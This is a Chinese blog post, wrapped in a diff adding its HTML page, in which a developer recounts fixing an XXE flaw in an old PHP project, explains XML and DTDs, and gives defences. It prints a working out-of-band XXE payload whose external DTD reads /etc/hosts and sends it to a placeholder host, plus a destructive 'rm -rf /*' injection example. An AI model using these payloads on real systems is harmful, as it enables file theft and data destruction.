@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Seven's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="最近很忙，没有停下来脚步思考一些事情，没有整理遇到过的问题，没有停下来脚步听听内心的声音。  XXE 漏洞 某天安平的同事扫出来了我们以前很老旧的某个PHP项目有XXE漏洞，对于XXE之前没有碰到过这种漏洞，通过漏洞单的大概描述，了解了大概是跟XML以及DTD有关系。  XXE称为XML实体注入(XML External Entity)，他出现在我们的XML文件内，当允许引用外部实体时，通过构造恶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次XXE漏洞">
+<meta property="og:url" content="http://sevencai.github.io/2020/06/20/记五月和六月/index.html">
+<meta property="og:site_name" content="Seven&#39;s Blog">
+<meta property="og:description" content="最近很忙，没有停下来脚步思考一些事情，没有整理遇到过的问题，没有停下来脚步听听内心的声音。  XXE 漏洞 某天安平的同事扫出来了我们以前很老旧的某个PHP项目有XXE漏洞，对于XXE之前没有碰到过这种漏洞，通过漏洞单的大概描述，了解了大概是跟XML以及DTD有关系。  XXE称为XML实体注入(XML External Entity)，他出现在我们的XML文件内，当允许引用外部实体时，通过构造恶">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/xianshi.png">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/sendserver.png">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/sendserverdtd.png">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/ssrf.png">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/exec.png">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/zhuru.png">
+<meta property="og:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/tance.png">
+<meta property="og:updated_time" content="2020-06-30T15:05:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次XXE漏洞">
+<meta name="twitter:description" content="最近很忙，没有停下来脚步思考一些事情，没有整理遇到过的问题，没有停下来脚步听听内心的声音。  XXE 漏洞 某天安平的同事扫出来了我们以前很老旧的某个PHP项目有XXE漏洞，对于XXE之前没有碰到过这种漏洞，通过漏洞单的大概描述，了解了大概是跟XML以及DTD有关系。  XXE称为XML实体注入(XML External Entity)，他出现在我们的XML文件内，当允许引用外部实体时，通过构造恶">
+<meta name="twitter:image" content="http://sevencai.github.io/2020/06/20/记五月和六月/xianshi.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://sevencai.github.io/2020/06/20/记五月和六月/"/>
+
+
+
+
+
+  <title>记一次XXE漏洞 | Seven's Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?157d49c9f81aaca6e7af073620a0a709";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Seven's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Share, Learn, Enjoy, Keep</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sevencai.github.io/2020/06/20/记五月和六月/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Seven Cai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Seven's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">记一次XXE漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-20T19:11:54+08:00">
+                2020-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/06/20/记五月和六月/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/06/20/记五月和六月/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近很忙，没有停下来脚步思考一些事情，没有整理遇到过的问题，没有停下来脚步听听内心的声音。</p>
+<hr>
+<h2 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h2><blockquote>
+<p>某天安平的同事扫出来了我们以前很老旧的某个PHP项目有XXE漏洞，对于XXE之前没有碰到过这种漏洞，通过漏洞单的大概描述，了解了大概是跟XML以及DTD有关系。</p>
+</blockquote>
+<p>XXE称为XML实体注入(XML External Entity)，他出现在我们的XML文件内，当允许引用外部实体时，通过构造恶意实体内容，从而可能导致如：</p>
+<p>1、读取任意文件（read file）<br>2、内网端口探测（scan port）<br>3、服务端请求伪造 （SSRF）<br>4、执行系统命令 （exec command）</p>
+<p>了解XXE需要先大致的了解下XML以及DTD。</p>
+<hr>
+<h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML是一种是一种类似HTML的可扩展标记语言，它的标记都是自定义的，其设计宗旨是包含和传输数据。和HTML不一样，他的核心设计是包含和传输数据，类似于json。而HTML偏向于展示内容和数据。在Android应用编写和微信公众号里之前经常会用到。举例为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>DTD包括两种类型：内部的 DOCTYPE 声明以及外部文档声明。</p>
+<hr>
+<h3 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a>内部的 DOCTYPE 声明</h3><p>内部的声明被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//规范</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"></span><br><span class="line">// 举例</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>解释为：<br><code>!DOCTYPE note</code> (第二行)定义此文档是 note 类型的文档。<br><code>!ELEMENT note</code> (第三行)定义 note 元素有四个元素：”to、from、heading,、body”<br><code>!ELEMENT to</code> (第四行)定义 to 元素为 “#PCDATA” 类型<br><code>!ELEMENT from</code> (第五行)定义 from 元素为 “#PCDATA” 类型<br><code>!ELEMENT heading</code> (第六行)定义 heading 元素为 “#PCDATA” 类型<br><code>!ELEMENT body</code> (第七行)定义 body 元素为 “#PCDATA” 类型</p>
+<hr>
+<h3 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h3><p>假如 DTD 位于 XML 源文件的外部，那么XML通过这种方式引用的，就叫做外部文档声明。那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 规范</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>包含 DTD 的 “note.dtd” 文件可能为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上面的这个文件可能是个系统路径，实际上他还可能是个http文件地址。比如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt; <span class="meta">&lt;!DOCTYPE file [&lt;!ENTITY % aaa SYSTEM "http://xxxxx.ip/xx.dtd"&gt;%aaa;%ccc;%ddd;]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>DTD的好处就是比较好的能够描述自身格式的描述、可以使用某个统一的标准来定义格式。</p>
+<hr>
+<h2 id="XXE漏洞的原理及案例"><a href="#XXE漏洞的原理及案例" class="headerlink" title="XXE漏洞的原理及案例"></a>XXE漏洞的原理及案例</h2><p>了解了XML以及DDT,再来了解XXE就比较清楚了。XXE出现于上面两种方式中的：外部文档声明的情况。<strong>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</strong></p>
+<p>比如本次我遇到的漏洞就是通过向我们的那个老旧的php文件post以下内容后，就可以得到<code>/etc/hosts</code>内的内容了。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt; <span class="meta">&lt;!DOCTYPE file [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % aaa SYSTEM "http://xxxxx.ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %aaa;%ccc;%ddd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>evil.dtd里面的内容可能是:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % bbb SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts"&gt;&lt;!ENTITY % ccc "&lt;!ENTITY % ddd SYSTEM 'http://xxx.ip/b?%bbb;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>类似的，可以把<code>evil.dtd</code>里的文件内容变成<code>etc/passwd</code>。这个是非常危险的操作。</p>
+<p>最后我使用的解决方法比较简单，在php内禁用实体的外部引用即可。如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="扩展案例"><a href="#扩展案例" class="headerlink" title="扩展案例"></a>扩展案例</h2><p>以上我遇到的案例是XXE的风险之一-读取文件漏洞，除了这以外，在学习这个过称中我还看到了有其他的案例也会造成多样的漏洞问题，这里总结如下：（特别说明下：以下案例非真实经历，如果图片涉及到了侵权，麻烦联系我及时删掉）。</p>
+<h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><p>如显示的展示漏洞，比如读到了xml信息后,直接print出来。显示的打印出来了<code>xml</code>信息。里面就有引用实体的内容。<br><img src="xianshi.png" alt="显示读取"></p>
+<p>数据即使不回显也可能会有问题，因为可以想办法触发漏洞以后把文件发送到攻击者的网站。如上我自己遇到的案例就是这种情况。<br><img src="sendserver.png" alt="不显示读取"><br>dtd文件为：<br><img src="sendserverdtd.png" alt="dtd文件"><br>这样触发了工具后，就把漏洞发送到攻击者的网站了。验证自己有没有解决这个问题，就可以查看有没有给这个网站发送请求即可。</p>
+<hr>
+<h3 id="SSRF攻击"><a href="#SSRF攻击" class="headerlink" title="SSRF攻击"></a>SSRF攻击</h3><p><img src="ssrf.png" alt="服务端攻击"></p>
+<p>这个就比较好理解了，有一丢丢类似于前端的csrf。这里利用了文件可以引用外部实体的因素，利用服务器做中转去访问了第三方网站。</p>
+<hr>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><img src="exec.png" alt="执行命令"><br>如上是安装expect扩展的PHP环境里执行系统命令。感觉有一丢丢像我之前了解的命令行注入的影子。命令行注入是指：命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令。<br><img src="zhuru.png" alt="命令行注入"><br>比如上面的这个如果传入的是<code>git clone xxx &amp;&amp; rm -rf /*</code>，然后又刚好有root权限就完了。</p>
+<hr>
+<h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p><img src="tance.png" alt="探测"><br>这个例子探测了192.168.1.1的80、81端口，通过返回的状态，比如“Connection refused”可以知道哪个是开的哪个是关掉的。另外还可以把IP换成域名，利用当前服务器DNS尝试解析内部域名来获取内网IP。</p>
+<hr>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>目前有两种比较简单和有效的方法：</p>
+<p>1、第一种是直接在代码中禁用外部的实体引用。如上实际案例中我就是通过这种方法解决的。<br>2、可以通过过滤关键词的方法，如把<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code>过滤掉。但是这个要小心处理，有一定的风险。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上记录了我经历的之前的一次XXE漏洞，通过解决这个漏洞，去了解了类似的漏洞。比较感兴趣因此记录了下来。</p>
+<p>最近被一些问题困扰，不是技术问题，会有很难受的时候，但是问题总会被解决，时间会证明一切。如果这个过称中你难受了，那就积极的去解决问题，正面面对他。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/25/近日梳理/" rel="next" title="近日梳理">
+                <i class="fa fa-chevron-left"></i> 近日梳理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Seven Cai</p>
+              <p class="site-description motion-element" itemprop="description">Seven的博客，用于记录生活和技术</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">132</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE-漏洞"><span class="nav-number">1.</span> <span class="nav-text"><a href="#XXE-&#x6F0F;&#x6D1E;" class="headerlink" title="XXE &#x6F0F;&#x6D1E;"></a>XXE &#x6F0F;&#x6D1E;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XML"><span class="nav-number">2.</span> <span class="nav-text"><a href="#&#x4EC0;&#x4E48;&#x662F;XML" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;XML"></a>&#x4EC0;&#x4E48;&#x662F;XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是DTD"><span class="nav-number">3.</span> <span class="nav-text"><a href="#&#x4EC0;&#x4E48;&#x662F;DTD" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;DTD"></a>&#x4EC0;&#x4E48;&#x662F;DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内部的-DOCTYPE-声明"><span class="nav-number">3.1.</span> <span class="nav-text"><a href="#&#x5185;&#x90E8;&#x7684;-DOCTYPE-&#x58F0;&#x660E;" class="headerlink" title="&#x5185;&#x90E8;&#x7684; DOCTYPE &#x58F0;&#x660E;"></a>&#x5185;&#x90E8;&#x7684; DOCTYPE &#x58F0;&#x660E;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#外部文档声明"><span class="nav-number">3.2.</span> <span class="nav-text"><a href="#&#x5916;&#x90E8;&#x6587;&#x6863;&#x58F0;&#x660E;" class="headerlink" title="&#x5916;&#x90E8;&#x6587;&#x6863;&#x58F0;&#x660E;"></a>&#x5916;&#x90E8;&#x6587;&#x6863;&#x58F0;&#x660E;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE漏洞的原理及案例"><span class="nav-number">4.</span> <span class="nav-text"><a href="#XXE&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x53CA;&#x6848;&#x4F8B;" class="headerlink" title="XXE&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x53CA;&#x6848;&#x4F8B;"></a>XXE&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x53CA;&#x6848;&#x4F8B;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扩展案例"><span class="nav-number">5.</span> <span class="nav-text"><a href="#&#x6269;&#x5C55;&#x6848;&#x4F8B;" class="headerlink" title="&#x6269;&#x5C55;&#x6848;&#x4F8B;"></a>&#x6269;&#x5C55;&#x6848;&#x4F8B;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读取漏洞"><span class="nav-number">5.1.</span> <span class="nav-text"><a href="#&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;"></a>&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF攻击"><span class="nav-number">5.2.</span> <span class="nav-text"><a href="#SSRF&#x653B;&#x51FB;" class="headerlink" title="SSRF&#x653B;&#x51FB;"></a>SSRF&#x653B;&#x51FB;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-number">5.3.</span> <span class="nav-text"><a href="#&#x547D;&#x4EE4;&#x6267;&#x884C;" class="headerlink" title="&#x547D;&#x4EE4;&#x6267;&#x884C;"></a>&#x547D;&#x4EE4;&#x6267;&#x884C;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口探测"><span class="nav-number">5.4.</span> <span class="nav-text"><a href="#&#x7AEF;&#x53E3;&#x63A2;&#x6D4B;" class="headerlink" title="&#x7AEF;&#x53E3;&#x63A2;&#x6D4B;"></a>&#x7AEF;&#x53E3;&#x63A2;&#x6D4B;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御方法"><span class="nav-number">6.</span> <span class="nav-text"><a href="#&#x9632;&#x5FA1;&#x65B9;&#x6CD5;" class="headerlink" title="&#x9632;&#x5FA1;&#x65B9;&#x6CD5;"></a>&#x9632;&#x5FA1;&#x65B9;&#x6CD5;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text"><a href="#&#x603B;&#x7ED3;" class="headerlink" 